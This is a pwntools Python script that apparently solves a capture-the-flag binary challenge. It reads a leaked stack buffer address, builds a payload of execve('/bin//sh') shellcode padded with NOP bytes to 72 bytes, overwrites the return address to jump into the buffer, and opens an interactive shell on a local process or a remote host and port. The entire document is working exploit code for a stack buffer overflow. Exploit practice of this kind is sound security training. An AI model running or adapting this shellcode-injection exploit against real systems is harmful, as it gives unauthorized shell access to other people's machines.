#!/usr/bin/env python3
from pwn import *
import sys

FILENAME = "./src/chal"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
exe = context.binary = ELF(FILENAME)

if len(sys.argv) == 1:
    r = process(FILENAME, aslr=False)
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

r.recvuntil(b"Buffer address: ")
buf_addr = int(r.recvuntil(b"\n", drop=True), 16)

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload = shellcode.ljust(72, b"\x90") + p64(buf_addr)

r.recvuntil(b"Input your data: ")
r.sendline(payload)

r.interactive()
